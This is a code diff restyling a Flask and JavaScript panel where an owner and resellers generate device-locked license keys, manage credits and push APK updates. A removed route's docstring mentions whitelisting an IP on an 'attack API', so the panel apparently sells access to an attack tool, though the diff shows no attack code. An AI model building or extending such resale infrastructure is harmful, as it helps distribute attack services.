+  coin:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"/><path d="M12 7v10M9 9h4.5a1.5 1.5 0 010 3H9M9 12h5a1.5 1.5 0 010 3H9"/></svg>',
+  rate:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 17l5-5 4 4 8-8M14 8h6v6"/></svg>',
+  plus:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><path d="M12 5v14M5 12h14"/></svg>',
+  arrow:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round" style="width:14px;height:14px"><path d="M5 12h14M13 6l6 6-6 6"/></svg>',
+  empty:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 7l9-4 9 4-9 4-9-4z"/><path d="M3 12l9 4 9-4M3 17l9 4 9-4"/></svg>',
+};
 
 // ═══════════════════════════════════════════
 // OWNER DASHBOARD
@@ -442,38 +561,60 @@ let activeKeys=0,expiredKeys=0,totalDevices=0;
 allKeys.forEach(k=>{k.expires_at&&new Date(k.expires_at)>now?activeKeys++:(!k.expires_at?activeKeys++:expiredKeys++);totalDevices+=(k.locked_device_ids||[]).length;});
 
 container.innerHTML=`
-<div class="header-row">
-<h2>Owner Dashboard</h2>
-<div class="header-actions">
-<button class="btn btn-blue" onclick="showAddReseller()">+ Add Reseller</button>
-<button class="btn btn-purple" onclick="showResellerList()">Reseller List</button>
+<div class="hero">
+<div class="hero-icon">${ICONS.spark}</div>
+<div class="hero-text">
+<h1>${greeting()}, ${DISPLAY_NAME}!</h1>
+<p>Here's an overview of your panel today.</p>
+</div>
+<div class="hero-actions">
+<button class="hero-btn primary" onclick="showAddReseller()">${ICONS.plus} Add Reseller</button>
+<button class="hero-btn outline" onclick="showResellerList()">View Resellers</button>
 </div>
 </div>
+
 <div class="cards">
-<div class="stat-card"><div class="label">Total Keys</div><div class="value">${keys.length}</div></div>
-<div class="stat-card"><div class="label">Active</div><div class="value">${activeKeys}</div></div>
-<div class="stat-card"><div class="label">Resellers</div><div class="value">${resellers.length}</div></div>
-<div class="stat-card"><div class="label">Devices</div><div class="value">${totalDevices}</div></div>
+<div class="stat-card sc-blue"><div class="icon">${ICONS.key}</div><div class="label">Total Keys</div><div class="value">${keys.length}</div></div>
+<div class="stat-card sc-green"><div class="icon">${ICONS.check}</div><div class="label">Active Keys</div><div class="value">${activeKeys}</div></div>
+<div class="stat-card sc-orange"><div class="icon">${ICONS.users}</div><div class="label">Resellers</div><div class="value">${resellers.length}</div></div>
+<div class="stat-card sc-purple"><div class="icon">${ICONS.device}</div><div class="label">Devices</div><div class="value">${totalDevices}</div></div>
 </div>
+
 <div class="section">
-<div class="section-title">Generate Key (Owner - Unlimited)</div>
+<div class="section-head">
+<div class="se-icon" style="background:linear-gradient(135deg,#10b981,#059669);box-shadow:0 4px 12px rgba(16,185,129,.25)">${ICONS.plus}</div>
+<div class="se-text"><h3>Generate New Key</h3><p>Owner — unlimited generation</p></div>
+</div>
 <div class="form-grid">
 <div class="form-group"><label>Prefix</label><input id="kName" placeholder="e.g. VIP"></div>
 <div class="form-group"><label>Duration</label><input id="kDur" type="number" min="1" value="60"></div>
 <div class="form-group"><label>Unit</label><select id="kUnit"><option value="minutes">Minutes</option><option value="hours">Hours</option><option value="days">Days</option></select></div>
 <div class="form-group"><label>Devices</label><input id="kDev" type="number" min="1" value="1"></div>
 </div>
-<button class="btn btn-green" style="margin-top:14px" onclick="generateKey()">Generate</button>
-<div id="genResult" style="margin-top:12px;font-size:12px;color:#8b949e;font-family:monospace"></div>
+<button class="btn btn-green" style="margin-top:14px" onclick="generateKey()">⚡ Generate Key</button>
+<div id="genResult" style="margin-top:12px;font-size:13px;font-family:monospace"></div>
 </div>
+
 <div class="section">
-<div class="section-title">My Keys</div>
-<div style="overflow-x:auto"><table><thead><tr><th>Name</th><th>Key</th><th>Status</th><th>Devices</th><th>By</th><th></th><th></th></tr></thead>
-<tbody>${keys.map(k=>{const x=k.expires_at?new Date(k.expires_at)<now:false;const unredeemed=!k.redeemed;const devCount=Object.keys(k.devices_info||{}).length;const statusBadge=x?'<span class="badge badge-expired">Expired</span>':(unredeemed?'<span class="badge badge-active">Not Redeemed</span>':'<span class="badge badge-active">Active</span>');return`<tr><td>${k.name}</td><td class="mono" style="cursor:pointer;color:#58a6ff" onclick="copyKey('${k.key}')" title="Click to copy">${k.key}</td><td>${statusBadge}</td><td>${(k.locked_device_ids||[]).length}/${k.device_limit}</td><td>${k.generated_by||'owner'}</td><td><button class="btn btn-blue" style="padding:4px 10px;font-size:11px" onclick="showDevices('${k.id}',this)">📱 Devices</button></td><td><button class="btn btn-red" onclick="deleteKey('${k.id}')">Del</button></td></tr>`}).join('')||'<tr><td colspan="7" style="color:#8b949e">No keys</td></tr>'}</tbody></table></div>
+<div class="section-head">
+<div class="se-icon">${ICONS.key}</div>
+<div class="se-text"><h3>My Keys</h3><p>All keys generated by you</p></div>
+<div class="se-spacer"></div>
+<a class="view-all" onclick="showHistory()">History ${ICONS.arrow}</a>
 </div>
+<div class="table-wrap"><table><thead><tr><th>Name</th><th>Key</th><th>Status</th><th>Devices</th><th>By</th><th></th><th></th></tr></thead>
+<tbody>${keys.map(k=>{const x=k.expires_at?new Date(k.expires_at)<now:false;const unredeemed=!k.redeemed;const statusBadge=x?'<span class="badge badge-expired">Expired</span>':(unredeemed?'<span class="badge badge-unredeemed">Pending</span>':'<span class="badge badge-active">Active</span>');return`<tr><td><strong>${k.name}</strong></td><td class="mono" style="cursor:pointer" onclick="copyKey('${k.key}')" title="Click to copy">${k.key}</td><td>${statusBadge}</td><td>${(k.locked_device_ids||[]).length}/${k.device_limit}</td><td>${k.generated_by||'owner'}</td><td><button class="btn btn-blue" style="padding:6px 12px;font-size:11px" onclick="showDevices('${k.id}',this)">📱 Devices</button></td><td><button class="btn btn-red" style="padding:6px 12px;font-size:11px" onclick="deleteKey('${k.id}')">Delete</button></td></tr>`}).join('')||`<tr><td colspan="7"><div class="empty"><div class="empty-icon">${ICONS.empty}</div><p>No keys yet</p><span>Generate your first key above</span></div></td></tr>`}</tbody></table></div>
+</div>
+
 <div class="section">
-<button class="btn btn-purple" onclick="showHistory()">Key History (All Time)</button>
-<button class="btn btn-blue" style="margin-left:10px" onclick="showUpdateConfig()">⬆️ App Update Settings</button>
+<div class="section-head">
+<div class="se-icon" style="background:linear-gradient(135deg,#3b82f6,#1d4ed8);box-shadow:0 4px 12px rgba(59,130,246,.25)">${ICONS.rate}</div>
+<div class="se-text"><h3>Quick Actions</h3><p>Manage app & history</p></div>
+</div>
+<div style="display:flex;gap:10px;flex-wrap:wrap">
+<button class="btn btn-purple" onclick="showHistory()">📜 Key History</button>
+<button class="btn btn-blue" onclick="showUpdateConfig()">⬆️ App Update Settings</button>
+</div>
 </div>`;
 }
 
@@ -488,33 +629,50 @@ const now=new Date();
 let active=0;keys.forEach(k=>{if(new Date(k.expires_at)>now)active++});
 
 container.innerHTML=`
-<div class="header-row">
-<h2>Reseller Dashboard</h2>
-<span class="credit-badge" style="font-size:14px">${credits} Credits</span>
+<div class="hero">
+<div class="hero-icon" style="background:linear-gradient(135deg,#f59e0b,#ea580c);box-shadow:0 8px 20px rgba(245,158,11,.35)">${ICONS.spark}</div>
+<div class="hero-text">
+<h1>${greeting()}, ${DISPLAY_NAME}!</h1>
+<p>You have <strong>${credits}</strong> credits available — let's create some keys.</p>
 </div>
+<div class="hero-actions">
+<button class="hero-btn primary" onclick="document.getElementById('kName').focus()">${ICONS.plus} Generate Key</button>
+<button class="hero-btn outline" onclick="showHistory()">View History</button>
+</div>
+</div>
+
 <div class="cards">
-<div class="stat-card"><div class="label">My Keys</div><div class="value">${keys.length}</div></div>
-<div class="stat-card"><div class="label">Active</div><div class="value">${active}</div></div>
-<div class="stat-card"><div class="label">Credits</div><div class="value">${credits}</div></div>
-<div class="stat-card"><div class="label">Rate</div><div class="value">10/hr</div></div>
+<div class="stat-card sc-blue"><div class="icon">${ICONS.key}</div><div class="label">My Keys</div><div class="value">${keys.length}</div></div>
+<div class="stat-card sc-green"><div class="icon">${ICONS.check}</div><div class="label">Active</div><div class="value">${active}</div></div>
+<div class="stat-card sc-orange"><div class="icon">${ICONS.coin}</div><div class="label">Credits</div><div class="value">${credits}</div></div>
+<div class="stat-card sc-purple"><div class="icon">${ICONS.rate}</div><div class="label">Rate</div><div class="value">10/hr</div></div>
 </div>
+
 <div class="section">
-<div class="section-title">Generate Key (10 credits = 1 hour)</div>
+<div class="section-head">
+<div class="se-icon" style="background:linear-gradient(135deg,#10b981,#059669);box-shadow:0 4px 12px rgba(16,185,129,.25)">${ICONS.plus}</div>
+<div class="se-text"><h3>Generate New Key</h3><p>10 credits = 1 hour</p></div>
+</div>
 <div class="form-grid">
 <div class="form-group"><label>Prefix</label><input id="kName" placeholder="e.g. Client"></div>
 <div class="form-group"><label>Duration</label><input id="kDur" type="number" min="1" value="1"></div>
 <div class="form-group"><label>Unit</label><select id="kUnit"><option value="minutes">Minutes</option><option value="hours" selected>Hours</option><option value="days">Days</option></select></div>
 <div class="form-group"><label>Devices</label><input id="kDev" type="number" min="1" value="1"></div>
 </div>
-<button class="btn btn-green" style="margin-top:14px" onclick="resellerGenerate()">Generate (costs credits)</button>
-<div id="genResult" style="margin-top:12px;font-size:12px;color:#8b949e;font-family:monospace"></div>
+<button class="btn btn-green" style="margin-top:14px" onclick="resellerGenerate()">⚡ Generate (uses credits)</button>
+<div id="genResult" style="margin-top:12px;font-size:13px;font-family:monospace"></div>
 </div>
+
 <div class="section">
-<div class="section-title">My Keys</div>
-<div style="overflow-x:auto"><table><thead><tr><th>Name</th><th>Key</th><th>Status</th><th>Devices</th><th></th><th></th></tr></thead>
-<tbody>${keys.map(k=>{const x=k.expires_at?new Date(k.expires_at)<now:false;const unredeemed=!k.redeemed;const statusBadge=x?'<span class="badge badge-expired">Expired</span>':(unredeemed?'<span class="badge badge-active">Not Redeemed</span>':'<span class="badge badge-active">Active</span>');return`<tr><td>${k.name}</td><td class="mono" style="cursor:pointer;color:#58a6ff" onclick="copyKey('${k.key}')" title="Click to copy">${k.key}</td><td>${statusBadge}</td><td>${(k.locked_device_ids||[]).length}/${k.device_limit}</td><td><button class="btn btn-blue" style="padding:4px 10px;font-size:11px" onclick="showDevices('${k.id}',this)">📱 Devices</button></td><td><button class="btn btn-red" onclick="deleteKey('${k.id}')">Del</button></td></tr>`}).join('')||'<tr><td colspan="6" style="color:#8b949e">No keys</td></tr>'}</tbody></table></div>
+<div class="section-head">
+<div class="se-icon">${ICONS.key}</div>
+<div class="se-text"><h3>My Keys</h3><p>All keys you've created</p></div>
+<div class="se-spacer"></div>
+<a class="view-all" onclick="showHistory()">History ${ICONS.arrow}</a>
 </div>
-<div class="section"><button class="btn btn-purple" onclick="showHistory()">Key History</button></div>`;
+<div class="table-wrap"><table><thead><tr><th>Name</th><th>Key</th><th>Status</th><th>Devices</th><th></th><th></th></tr></thead>
+<tbody>${keys.map(k=>{const x=k.expires_at?new Date(k.expires_at)<now:false;const unredeemed=!k.redeemed;const statusBadge=x?'<span class="badge badge-expired">Expired</span>':(unredeemed?'<span class="badge badge-unredeemed">Pending</span>':'<span class="badge badge-active">Active</span>');return`<tr><td><strong>${k.name}</strong></td><td class="mono" style="cursor:pointer" onclick="copyKey('${k.key}')" title="Click to copy">${k.key}</td><td>${statusBadge}</td><td>${(k.locked_device_ids||[]).length}/${k.device_limit}</td><td><button class="btn btn-blue" style="padding:6px 12px;font-size:11px" onclick="showDevices('${k.id}',this)">📱 Devices</button></td><td><button class="btn btn-red" style="padding:6px 12px;font-size:11px" onclick="deleteKey('${k.id}')">Delete</button></td></tr>`}).join('')||`<tr><td colspan="6"><div class="empty"><div class="empty-icon">${ICONS.empty}</div><p>No keys yet</p><span>Create your first key above</span></div></td></tr>`}</tbody></table></div>
+</div>`;
 }
 
 // ═══════════════════════════════════════════
@@ -522,39 +680,39 @@ container.innerHTML=`
 // ═══════════════════════════════════════════
 async function generateKey(){
 const r=await api('/api/generate',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({name:document.getElementById('kName').value,duration_value:document.getElementById('kDur').value,duration_unit:document.getElementById('kUnit').value,device_limit:document.getElementById('kDev').value})});
-document.getElementById('genResult').innerHTML=r.error?`<span style="color:#f85149">${r.error}</span>`:`Key: <span style="color:#3fb950">${r.key}</span>`;
+document.getElementById('genResult').innerHTML=r.error?`<span style="color:#dc2626">⚠️ ${r.error}</span>`:`<div style="padding:12px 14px;background:#f0fdf4;border-left:3px solid #10b981;border-radius:8px;color:#065f46">✅ Generated: <strong style="color:#10b981;cursor:pointer" onclick="copyKey('${r.key}')">${r.key}</strong></div>`;
 render();
 }
 async function resellerGenerate(){
 const dur=parseInt(document.getElementById('kDur').value)||1;
 const unit=document.getElementById('kUnit').value;
 const r=await api('/api/generate',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({name:document.getElementById('kName').value,duration_value:dur,duration_unit:unit,device_limit:document.getElementById('kDev').value})});
-document.getElementById('genResult').innerHTML=r.error?`<span style="color:#f85149">${r.error}</span>`:`Key: <span style="color:#3fb950">${r.key}</span>`;
+document.getElementById('genResult').innerHTML=r.error?`<span style="color:#dc2626">⚠️ ${r.error}</span>`:`<div style="padding:12px 14px;background:#f0fdf4;border-left:3px solid #10b981;border-radius:8px;color:#065f46">✅ Generated: <strong style="color:#10b981;cursor:pointer" onclick="copyKey('${r.key}')">${r.key}</strong></div>`;
 render();
 }
 async function deleteKey(id){if(!confirm('Delete?'))return;await api('/api/delete-key',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id})});render();}
 
 function showAddReseller(){
 showModal(`<button class="close-btn" onclick="closeModal()">&times;</button>
-<h3>Add Reseller</h3>
+<h3>👤 Add New Reseller</h3>
 <div class="form-group" style="margin-bottom:12px"><label>Username</label><input id="rUser"></div>
 <div class="form-group" style="margin-bottom:12px"><label>Password</label><input id="rPass" type="password"></div>
 <div class="form-group" style="margin-bottom:12px"><label>Display Name</label><input id="rName"></div>
-<div class="form-group" style="margin-bottom:12px"><label>Initial Credits</label><input id="rCredits" type="number" value="100"></div>
-<button class="btn btn-green" onclick="addReseller()">Add</button>
-<div id="rResult" style="margin-top:10px;font-size:12px"></div>`);
+<div class="form-group" style="margin-bottom:14px"><label>Initial Credits</label><input id="rCredits" type="number" value="100"></div>
+<button class="btn btn-green" style="width:100%" onclick="addReseller()">Create Reseller</button>
+<div id="rResult" style="margin-top:12px;font-size:13px"></div>`);
 }
 async function addReseller(){
 const r=await api('/api/add-reseller',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username:document.getElementById('rUser').value,password:document.getElementById('rPass').value,display_name:document.getElementById('rName').value,credits:parseInt(document.getElementById('rCredits').value)||0})});
-document.getElementById('rResult').innerHTML=r.error?`<span style="color:#f85149">${r.error}</span>`:`<span style="color:#3fb950">Reseller added!</span>`;
+document.getElementById('rResult').innerHTML=r.error?`<span style="color:#dc2626">⚠️ ${r.error}</span>`:`<span style="color:#10b981;font-weight:600">✅ Reseller added successfully!</span>`;
 render();
 }
 
 async function showResellerList(){
 const resellers=await api('/api/resellers');
-let html=`<button class="close-btn" onclick="closeModal()">&times;</button><h3>Resellers</h3><table><thead><tr><th>Name</th><th>Credits</th><th>Add Credits</th><th></th></tr></thead><tbody>`;
-resellers.forEach(r=>{html+=`<tr><td><a href="#" onclick="viewResellerDash('${r.username}');closeModal()" style="color:#58a6ff">${r.display_name}</a></td><td class="credit-badge">${r.credits}</td><td><input id="cr_${r.username}" type="number" value="100" style="width:70px;padding:4px;background:#0d1117;border:1px solid #21262d;border-radius:4px;color:#f0f6fc"><button class="btn btn-blue" style="padding:4px 8px;margin-left:4px;font-size:11px" onclick="addCredits('${r.username}')">+</button></td><td><button class="btn btn-red" style="padding:4px 8px;font-size:11px" onclick="deleteReseller('${r.username}')">Del</button></td></tr>`;});
-html+=`</tbody></table>`;
+let html=`<button class="close-btn" onclick="closeModal()">&times;</button><h3>👥 Resellers</h3><div class="table-wrap"><table><thead><tr><th>Name</th><th>Credits</th><th>Add</th><th></th></tr></thead><tbody>`;
+resellers.forEach(r=>{html+=`<tr><td><a href="#" onclick="viewResellerDash('${r.username}');closeModal()" style="color:#6366f1;text-decoration:none;font-weight:600">${r.display_name}</a></td><td><span class="credit-badge">${r.credits}</span></td><td><input id="cr_${r.username}" type="number" value="100" style="width:75px;padding:6px 8px;background:#f9fafb;border:1.5px solid #e5e7eb;border-radius:8px;color:#1a1a2e;font-size:12px;font-family:inherit"><button class="btn btn-blue" style="padding:5px 10px;margin-left:6px;font-size:11px" onclick="addCredits('${r.username}')">+</button></td><td><button class="btn btn-red" style="padding:5px 10px;font-size:11px" onclick="deleteReseller('${r.username}')">Del</button></td></tr>`;});
+html+=`</tbody></table></div>`;
 showModal(html);
 }
 async function addCredits(username){
@@ -567,16 +725,26 @@ async function viewResellerDash(username){
 const data=await api('/api/reseller-dashboard?username='+username);
 const keys=data.keys||[];const now=new Date();
 const history=await api('/api/history?by='+username);
-container.innerHTML=`<div class="header-row"><h2>${data.display_name}'s Dashboard</h2><button class="btn btn-blue" onclick="render()">Back</button></div>
-<div class="cards"><div class="stat-card"><div class="label">Active Keys</div><div class="value">${keys.length}</div></div><div class="stat-card"><div class="label">Credits</div><div class="value">${data.credits}</div></div><div class="stat-card"><div class="label">All Time Keys</div><div class="value">${history.length}</div></div></div>
-<div class="section"><div class="section-title">Active Keys</div><div style="overflow-x:auto"><table><thead><tr><th>Name</th><th>Key</th><th>Expires</th><th>Devices</th></tr></thead><tbody>${keys.map(k=>`<tr><td>${k.name}</td><td class="mono">${k.key}</td><td>${k.expires_at?new Date(k.expires_at).toLocaleString():'Not Redeemed'}</td><td>${(k.locked_device_ids||[]).length}/${k.device_limit}</td></tr>`).join('')||'<tr><td colspan="4" style="color:#8b949e">No active keys</td></tr>'}</tbody></table></div></div>
-<div class="section"><div class="section-title">Key History (All Time)</div><div style="overflow-x:auto;max-height:300px"><table><thead><tr><th>Key</th><th>Created</th><th>Duration</th></tr></thead><tbody>${history.map(h=>`<tr><td class="mono">${h.key}</td><td>${new Date(h.created_at).toLocaleString()}</td><td>${h.duration_value} ${h.duration_unit}</td></tr>`).join('')||'<tr><td colspan="3" style="color:#8b949e">No history</td></tr>'}</tbody></table></div></div>`;
+container.innerHTML=`
+<div class="hero">
+<div class="hero-icon" style="background:linear-gradient(135deg,#a855f7,#7c3aed);box-shadow:0 8px 20px rgba(168,85,247,.35)">${ICONS.users}</div>
+<div class="hero-text"><h1>${data.display_name}</h1><p>Reseller dashboard overview</p></div>
+<div class="hero-actions"><button class="hero-btn outline" onclick="render()">← Back</button></div>
+</div>
+<div class="cards">
+<div class="stat-card sc-blue"><div class="icon">${ICONS.key}</div><div class="label">Active Keys</div><div class="value">${keys.length}</div></div>
+<div class="stat-card sc-orange"><div class="icon">${ICONS.coin}</div><div class="label">Credits</div><div class="value">${data.credits}</div></div>
+<div class="stat-card sc-purple"><div class="icon">${ICONS.rate}</div><div class="label">All Time Keys</div><div class="value">${history.length}</div></div>
+</div>
+<div class="section"><div class="section-head"><div class="se-icon">${ICONS.key}</div><div class="se-text"><h3>Active Keys</h3><p>Currently usable</p></div></div><div class="table-wrap"><table><thead><tr><th>Name</th><th>Key</th><th>Expires</th><th>Devices</th></tr></thead><tbody>${keys.map(k=>`<tr><td><strong>${k.name}</strong></td><td class="mono">${k.key}</td><td>${k.expires_at?new Date(k.expires_at).toLocaleString():'Not Redeemed'}</td><td>${(k.locked_device_ids||[]).length}/${k.device_limit}</td></tr>`).join('')||`<tr><td colspan="4"><div class="empty"><div class="empty-icon">${ICONS.empty}</div><p>No active keys</p></div></td></tr>`}</tbody></table></div></div>
+<div class="section"><div class="section-head"><div class="se-icon" style="background:linear-gradient(135deg,#3b82f6,#1d4ed8);box-shadow:0 4px 12px rgba(59,130,246,.25)">${ICONS.rate}</div><div class="se-text"><h3>Key History</h3><p>All-time generated keys</p></div></div><div class="table-wrap" style="max-height:340px;overflow-y:auto"><table><thead><tr><th>Key</th><th>Created</th><th>Duration</th></tr></thead><tbody>${history.map(h=>`<tr><td class="mono">${h.key}</td><td>${new Date(h.created_at).toLocaleString()}</td><td>${h.duration_value} ${h.duration_unit}</td></tr>`).join('')||`<tr><td colspan="3"><div class="empty"><div class="empty-icon">${ICONS.empty}</div><p>No history</p></div></td></tr>`}</tbody></table></div></div>`;
 }
 
 async function showHistory(){
 const history=await api('/api/history');
-let html=`<button class="close-btn" onclick="closeModal()">&times;</button><h3>Key History</h3><div style="max-height:400px;overflow-y:auto"><table><thead><tr><th>Key</th><th>By</th><th>Created</th><th>Duration</th></tr></thead><tbody>`;
+let html=`<button class="close-btn" onclick="closeModal()">&times;</button><h3>📜 Key History</h3><div class="table-wrap" style="max-height:420px;overflow-y:auto"><table><thead><tr><th>Key</th><th>By</th><th>Created</th><th>Duration</th></tr></thead><tbody>`;
 history.forEach(h=>{html+=`<tr><td class="mono">${h.key}</td><td>${h.generated_by||'owner'}</td><td>${new Date(h.created_at).toLocaleString()}</td><td>${h.duration_value} ${h.duration_unit}</td></tr>`});
+if(history.length===0)html+=`<tr><td colspan="4"><div class="empty"><div class="empty-icon">${ICONS.empty}</div><p>No history yet</p></div></td></tr>`;
 html+=`</tbody></table></div>`;
 showModal(html);
 }
@@ -589,9 +757,10 @@ const key=keys.find(k=>k.id===keyId);
 if(!key)return;
 const devInfo=key.devices_info||{};
 const devices=Object.entries(devInfo);
+const colspan=ROLE==='owner'?7:6;
 let html='';
-if(devices.length===0){html='<td colspan="7" style="padding:8px 10px;background:#f9fafb;color:#888;font-size:11px">No devices connected yet.</td>'}
-else{html=`<td colspan="7" style="padding:0;background:#f9fafb"><table style="width:100%;margin:0"><thead><tr style="background:#f0f2f5"><th style="font-size:10px;padding:6px">#</th><th style="font-size:10px;padding:6px">Model</th><th style="font-size:10px;padding:6px">Android</th><th style="font-size:10px;padding:6px">First Seen</th><th style="font-size:10px;padding:6px">Device ID</th></tr></thead><tbody>${devices.map(([id,info],i)=>`<tr><td style="font-size:11px;padding:5px">${i+1}</td><td style="font-size:11px;padding:5px"><strong>${info.model||'Unknown'}</strong></td><td style="font-size:11px;padding:5px">${info.android_version||'—'}</td><td style="font-size:11px;padding:5px">${info.first_seen?new Date(info.first_seen).toLocaleString():'—'}</td><td class="mono" style="font-size:9px;padding:5px;color:#888">${id.substring(0,14)}</td></tr>`).join('')}</tbody></table></td>`}
+if(devices.length===0){html=`<td colspan="${colspan}" style="padding:18px;background:#fafbff;color:#9ca3af;font-size:13px;text-align:center">📱 No devices connected yet.</td>`}
+else{html=`<td colspan="${colspan}" style="padding:0;background:#fafbff"><table style="width:100%;margin:0"><thead><tr style="background:#f3f4f6"><th style="font-size:10px;padding:8px">#</th><th style="font-size:10px;padding:8px">Model</th><th style="font-size:10px;padding:8px">Android</th><th style="font-size:10px;padding:8px">First Seen</th><th style="font-size:10px;padding:8px">Device ID</th></tr></thead><tbody>${devices.map(([id,info],i)=>`<tr><td style="font-size:12px;padding:8px;color:#6366f1;font-weight:700">${i+1}</td><td style="font-size:12px;padding:8px"><strong>${info.model||'Unknown'}</strong></td><td style="font-size:12px;padding:8px">${info.android_version||'—'}</td><td style="font-size:12px;padding:8px">${info.first_seen?new Date(info.first_seen).toLocaleString():'—'}</td><td class="mono" style="font-size:10px;padding:8px">${id.substring(0,18)}…</td></tr>`).join('')}</tbody></table></td>`}
 const tr=document.createElement('tr');
 tr.id='dev_'+keyId;
 tr.innerHTML=html;
@@ -599,35 +768,35 @@ const parentRow=btn.closest('tr');
 parentRow.parentNode.insertBefore(tr,parentRow.nextSibling);
 }
 
-function copyKey(key){navigator.clipboard.writeText(key).then(()=>{const t=document.createElement('div');t.textContent='✅ Key Copied!';t.style.cssText='position:fixed;top:20px;right:20px;background:#10b981;color:#fff;padding:10px 20px;border-radius:8px;font-size:13px;font-weight:600;z-index:9999;animation:fadeOut 2s forwards';document.body.appendChild(t);setTimeout(()=>t.remove(),2000)}).catch(()=>prompt('Copy this key:',key))}
+function copyKey(key){navigator.clipboard.writeText(key).then(()=>{const t=document.createElement('div');t.textContent='✅ Key Copied!';t.style.cssText='position:fixed;top:20px;right:20px;background:linear-gradient(135deg,#10b981,#059669);color:#fff;padding:12px 22px;border-radius:12px;font-size:13px;font-weight:600;z-index:9999;box-shadow:0 8px 24px rgba(16,185,129,.4);animation:fadeOut 2s forwards';document.body.appendChild(t);setTimeout(()=>t.remove(),2000)}).catch(()=>prompt('Copy this key:',key))}
 
 async function showUpdateConfig(){
 const config=await api('/api/update-config');
 showModal(`<button class="close-btn" onclick="closeModal()">&times;</button>
 <h3>⬆️ App Update Settings</h3>
-<p style="font-size:12px;color:#888;margin-bottom:16px">Upload new APK here. Users will get update popup in app.</p>
+<p style="font-size:13px;color:#6b7280;margin-bottom:18px">Upload new APK here. Users will see update popup in app.</p>
 <form id="updateForm" enctype="multipart/form-data">
-<div class="form-group" style="margin-bottom:12px"><label>Version Code (increment: ${config.latest_version_code} → ${config.latest_version_code+1})</label><input id="uVerCode" type="number" value="${config.latest_version_code+1}"></div>
-<div class="form-group" style="margin-bottom:12px"><label>Version Name</label><input id="uVerName" value="${config.latest_version_name}"></div>
-<div class="form-group" style="margin-bottom:12px"><label>Changelog</label><input id="uChangelog" value="${config.changelog||''}" placeholder="e.g. Bug fixes, new UI"></div>
-<div class="form-group" style="margin-bottom:12px"><label>APK File</label><input id="uApkFile" type="file" accept=".apk" style="padding:8px"></div>
-${config.has_apk?'<p style="font-size:11px;color:#10b981;margin-bottom:12px">✅ Current APK: '+config.apk_filename+'</p>':''}
-<button type="button" class="btn btn-green" onclick="uploadUpdate()">Upload & Publish Update</button>
+<div class="form-group" style="margin-bottom:14px"><label>Version Code (next: ${config.latest_version_code} → ${config.latest_version_code+1})</label><input id="uVerCode" type="number" value="${config.latest_version_code+1}"></div>
+<div class="form-group" style="margin-bottom:14px"><label>Version Name</label><input id="uVerName" value="${config.latest_version_name}"></div>
+<div class="form-group" style="margin-bottom:14px"><label>Changelog</label><input id="uChangelog" value="${config.changelog||''}" placeholder="e.g. Bug fixes, new UI"></div>
+<div class="form-group" style="margin-bottom:14px"><label>APK File</label><input id="uApkFile" type="file" accept=".apk" style="padding:10px"></div>
+${config.has_apk?'<p style="font-size:12px;color:#10b981;margin-bottom:14px;background:#f0fdf4;padding:8px 12px;border-radius:8px;font-weight:600">✅ Current APK: '+config.apk_filename+'</p>':''}
+<button type="button" class="btn btn-green" style="width:100%" onclick="uploadUpdate()">⬆️ Upload & Publish Update</button>
 </form>
-<div id="uResult" style="margin-top:12px;font-size:12px"></div>`);
+<div id="uResult" style="margin-top:12px;font-size:13px"></div>`);
 }
 async function uploadUpdate(){
 const form=new FormData();
 const file=document.getElementById('uApkFile').files[0];
-if(!file){document.getElementById('uResult').innerHTML='<span style="color:#f85149">Select APK file</span>';return}
+if(!file){document.getElementById('uResult').innerHTML='<span style="color:#dc2626">⚠️ Select APK file</span>';return}
 form.append('apk_file',file);
 form.append('version_code',document.getElementById('uVerCode').value);
 form.append('version_name',document.getElementById('uVerName').value);
 form.append('changelog',document.getElementById('uChangelog').value);
-document.getElementById('uResult').innerHTML='<span style="color:#58a6ff">Uploading...</span>';
+document.getElementById('uResult').innerHTML='<span style="color:#3b82f6">⏳ Uploading...</span>';
 const r=await fetch('/api/upload-apk',{method:'POST',body:form});
 const data=await r.json();
-document.getElementById('uResult').innerHTML=data.error?'<span style="color:#f85149">'+data.error+'</span>':'<span style="color:#3fb950">✅ Update published! Users will see update popup now.</span>';
+document.getElementById('uResult').innerHTML=data.error?'<span style="color:#dc2626">⚠️ '+data.error+'</span>':'<div style="padding:10px 14px;background:#f0fdf4;border-left:3px solid #10b981;border-radius:8px;color:#065f46;font-weight:600">✅ Update published! Users will see update popup now.</div>';
 }
 
 function render(){if(ROLE==='owner')renderOwnerDashboard();else renderResellerDashboard();}
@@ -640,16 +809,6 @@ render();
 # ══════════════════════════════════════════════════════════════════
 # WEB ROUTES
 # ══════════════════════════════════════════════════════════════════
-
-@app.route('/myip')
-def myip():
-    """Show Railway's outbound IP — for whitelisting on attack API"""
-    try:
-        r = requests.get('https://api.ipify.org?format=json', timeout=10)
-        return jsonify({'railway_outbound_ip': r.json().get('ip', 'unknown')})
-    except Exception as e:
-        return jsonify({'error': str(e)})
-
 
 @app.route('/login', methods=['GET', 'POST'])
 def login():
@@ -687,7 +846,7 @@ def dashboard():
         r = find_reseller(session['username'])
         credits = r['credits'] if r else 0
     return render_template_string(DASHBOARD_TEMPLATE,
-        title='GODxPAWAN Panel',
+        title='ALONExRAJ Panel',
         role=session['role'],
         username=session['username'],
         display_name=session['display_name'],
@@ -1023,7 +1182,7 @@ def upload_apk():
     changelog = request.form.get('changelog', '')
 
     # Save APK
-    filename = f"GODxPAWAN_v{version_code}.apk"
+    filename = f"ALONExRAJ_v{version_code}.apk"
     filepath = os.path.join(UPLOAD_FOLDER, filename)
     file.save(filepath)
 
@@ -1046,11 +1205,6 @@ def upload_apk():
     return jsonify({'status': 'success', 'filename': filename})
 
 
-# ══════════════════════════════════════════════════════════════════
-# START APPLICATION WITH KEEP ALIVE
-# ══════════════════════════════════════════════════════════════════
-
-# Start the keep-alive background thread
 start_keep_alive()
 
 if __name__ == '__main__':
